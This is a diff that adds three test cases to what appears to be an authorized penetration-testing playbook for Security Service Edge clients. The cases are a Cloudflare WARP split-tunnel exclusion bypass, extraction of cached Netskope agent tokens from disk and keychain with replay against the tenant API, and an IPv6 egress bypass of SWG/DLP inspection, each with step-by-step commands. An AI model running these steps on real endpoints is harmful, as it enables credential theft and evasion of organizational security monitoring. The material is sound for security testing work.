@@ -15,7 +15,8 @@
 | D. Policy & Routing Bypass | 3 | HIGH - CRITICAL |
 | E. Anonymizer Evasion & Data Exfiltration | 2 | HIGH - CRITICAL |
 | F. Admin API & App Connector Compromise | 1 | CRITICAL |
-| **Total** | **12** | **LOW - CRITICAL** |
+| G. Additional Client-Side & Network Bypass | 3 | HIGH - CRITICAL |
+| **Total** | **15** | **LOW - CRITICAL** |
 
 ---
 
@@ -247,14 +248,69 @@
 
 ---
 
+## G. Additional Client-Side & Network Bypass
+
+### TC-SS-013: Cloudflare WARP Split-Tunnel Exclusion Manipulation
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-SS-013 |
+| **Name** | Cloudflare WARP Split-Tunnel Exclusion Manipulation (Local Admin) |
+| **Severity** | HIGH |
+| **Category** | Additional Client-Side & Network Bypass |
+| **Objective** | Demonstrate that a local admin on a WARP-managed endpoint can add a split-tunnel exclusion so that traffic to a target CIDR egresses directly, bypassing Cloudflare One (Gateway SWG) inspection. |
+| **Prerequisites** | Authorized lab device enrolled in Cloudflare Zero Trust with WARP client. Local admin. If managed by MDM, the split-tunnel configuration may be locked. |
+| **Tools** | warp-cli, curl, tcpdump |
+| **Steps** | 1. Verify WARP state: `warp-cli status` (expect Connected) and `curl -s https://www.cloudflare.com/cdn-cgi/trace/ \| grep warp=` (expect `warp=on`).<br>2. Identify the current split-tunnel configuration: `warp-cli tunnel exclusion list` (newer clients; older: `warp-cli exclude list`).<br>3. Add an exclusion for the test target's CIDR: `sudo warp-cli tunnel exclusion add 203.0.113.10/32` (older clients: `sudo warp-cli add-exclude 203.0.113.10/32`).<br>4. Confirm direct egress: `sudo tcpdump -ni en0 host 203.0.113.10 and tcp port 443` in one terminal, then `curl -s https://203.0.113.10/ -k -o /dev/null -w '%{local_port}\n'`. Packets on the physical interface (not the CloudflareWARP utun interface) confirm the flow bypasses the tunnel.<br>5. Compare egress IP: `curl -s https://www.cloudflare.com/cdn-cgi/trace/ \| grep ip=` while excluded vs included — the excluded flow shows the local network egress, not the Cloudflare egress.<br>6. Revert: `sudo warp-cli tunnel exclusion remove 203.0.113.10/32`. |
+| **Expected Result** | Either (a) the managed configuration rejects local exclusion changes (`Cannot update settings: not allowed by MDM`) — informational, hardened — or (b) the excluded CIDR egresses directly, bypassing Gateway HTTP filtering and DLP (HIGH). |
+| **False Positive Risk** | LOW — tcpdump on the physical interface is definitive. |
+| **Cleanup** | Remove the exclusion; `warp-cli disconnect && warp-cli connect` to restore a clean tunnel state. |
+| **References** | payloads.md §6 (split-tunnel bypass); Cloudflare WARP CLI documentation |
+
+### TC-SS-014: Netskope STAgent Cached Credential Extraction & Tenant API Replay
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-SS-014 |
+| **Name** | Netskope STAgent Cached Credential Extraction and Tenant API Replay |
+| **Severity** | CRITICAL |
+| **Category** | Additional Client-Side & Network Bypass |
+| **Objective** | Demonstrate that an attacker with local access to a Netskope-managed endpoint can extract cached agent credentials/tenant identifiers and replay them against the Netskope tenant API as the agent or user. |
+| **Prerequisites** | Authorized lab device running the Netskope client (STAgent/nspa) with an active session. Local user (elevation helps for system paths). |
+| **Tools** | find, cat, strings, jq, curl, security (macOS) |
+| **Steps** | 1. Locate agent data: macOS `sudo find ~/Library/Application\ Support/Netskope /Library/Application\ Support/Netskope -type f 2>/dev/null`; Windows `dir /S %APPDATA%\Netskope %PROGRAMDATA%\Netskope`.<br>2. Extract tenant identity from the agent config: `sudo cat /Library/Application\ Support/Netskope/STAgent/config/stagent-config.json 2>/dev/null \| jq . \| grep -iE 'org\|tenant\|url\|host'` — reveals the tenant subdomain (e.g., `acme.goskope.com`).<br>3. Hunt cached auth material: `sudo strings ~/Library/Application\ Support/Netskope/STAgent/*.db 2>/dev/null \| grep -oiE 'ey[A-Za-z0-9_-]{20,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' \| head` (JWT pattern); check the macOS keychain: `security find-generic-password -s Netskope 2>/dev/null` and `security dump-keychain 2>/dev/null \| grep -i netskope \| head`.<br>4. Replay against the tenant (authorized lab): `curl -s -H "Authorization: Bearer $NS_JWT" "https://<tenant>.goskope.com/api/v2/events?limit=1" \| jq .status`. A `200`/valid JSON status confirms replay; immediate `401` indicates per-session token rotation (informational).<br>5. If a session cookie was recovered instead, replay it against the tenant UI endpoints the agent calls (observe SNIs from TC-SS-002 methodology). |
+| **Expected Result** | Either (a) credentials are short-lived/rotated and replay fails (informational — hardened) or (b) a cached JWT/session replays successfully to the tenant API, giving attacker visibility/control under the user or agent identity (CRITICAL). |
+| **False Positive Risk** | LOW — a valid authenticated API response with the replayed token is definitive. |
+| **Cleanup** | Force the user to sign out/in to rotate the session; admin revokes active sessions in the Netskope console. |
+| **References** | payloads.md §3 (client connector reverse engineering); TC-SS-003 (Zscaler equivalent); Netskope client documentation |
+
+### TC-SS-015: IPv6 Dual-Stack Egress Bypass of SSE Tunnel
+
+| Field | Value |
+|------|-----|
+| **ID** | TC-SS-015 |
+| **Name** | IPv6 Dual-Stack Egress Bypass of the SSE Tunnel |
+| **Severity** | HIGH |
+| **Category** | Additional Client-Side & Network Bypass |
+| **Objective** | Demonstrate that on dual-stack networks where the SSE client only forwards IPv4 into the tunnel, IPv6 traffic egresses directly and bypasses SWG/DLP inspection. |
+| **Prerequisites** | Authorized lab network providing global IPv6 (a global — not `fe80::`/`fc00::` — address on the endpoint) and an SSE client deployment. A dual-stack test target or IPv6 echo service. |
+| **Tools** | ifconfig, netstat, curl, tcpdump |
+| **Steps** | 1. Confirm a global IPv6 address: `ifconfig \| grep inet6` (ignore `fe80::` link-local and `fc00::/7` ULA).<br>2. Compare default routes: `netstat -rn -f inet \| grep default` vs `netstat -rn -f inet6 \| grep default` — if the IPv4 default points into the SSE TUN/utun interface while the IPv6 default points at the physical gateway, IPv6 is not tunneled.<br>3. Test IPv6 egress: `curl -6 -s https://api64.ipify.org && echo` — if it returns the local network's IPv6 address (not the SSE egress), traffic egresses directly.<br>4. Verify with capture: `sudo tcpdump -ni en0 'ip6 and tcp port 443'` while generating HTTPS traffic over IPv6 — flows visible on the physical interface confirm bypass.<br>5. Test a blocked-category dual-stack domain over IPv6 (`curl -6 https://blocked-v6.example.com/`); if allowed while the IPv4 path is blocked, policy bypass is confirmed. |
+| **Expected Result** | Either (a) the client tunnels IPv6 as well, or IPv6 is blocked/unavailable (informational — hardened) or (b) IPv6 egresses directly and domain policy is bypassed on the v6 path (HIGH). |
+| **False Positive Risk** | LOW — the route table and physical-interface capture are definitive. |
+| **Cleanup** | None (read-only tests). |
+| **References** | payloads.md §6 (routing bypass); TC-SS-007 (split-tunnel race); RFC 8441/9110 dual-stack behavior |
+
+---
+
 ## Appendix: Severity Calibration
 
 | Severity | Definition | Example |
 |----------|------------|---------|
 | **LOW** | Reconnaissance / fingerprinting. No impact alone. | TC-SS-001 (vendor fingerprint) |
 | **MEDIUM** | Authenticated enumeration or protocol-level bypass that may be mitigated. | TC-SS-002 (tenant enum), TC-SS-005 (ECH bypass — depends on SSE configuration) |
-| **HIGH** | Confirmed bypass or credential theft granting unauthorized access. | TC-SS-003 (token cache extraction), TC-SS-004 (Frida posture hook), TC-SS-006 (DoH bypass), TC-SS-007 (split-tunnel race), TC-SS-008 (JA3 spoof), TC-SS-009 (Umbrella bypass), TC-SS-011 (Trojan evasion) |
-| **CRITICAL** | Full anonymity-exfiltration channel or App Connector compromise. | TC-SS-010 (V2Ray evasion), TC-SS-012 (App Connector cert compromise) |
+| **HIGH** | Confirmed bypass or credential theft granting unauthorized access. | TC-SS-003 (token cache extraction), TC-SS-004 (Frida posture hook), TC-SS-006 (DoH bypass), TC-SS-007 (split-tunnel race), TC-SS-008 (JA3 spoof), TC-SS-009 (Umbrella bypass), TC-SS-011 (Trojan evasion), TC-SS-013 (WARP split-tunnel exclusion), TC-SS-015 (IPv6 egress bypass) |
+| **CRITICAL** | Full anonymity-exfiltration channel or App Connector compromise. | TC-SS-010 (V2Ray evasion), TC-SS-012 (App Connector cert compromise), TC-SS-014 (Netskope credential replay) |
 
 ## Appendix: Test Tenant Setup
 
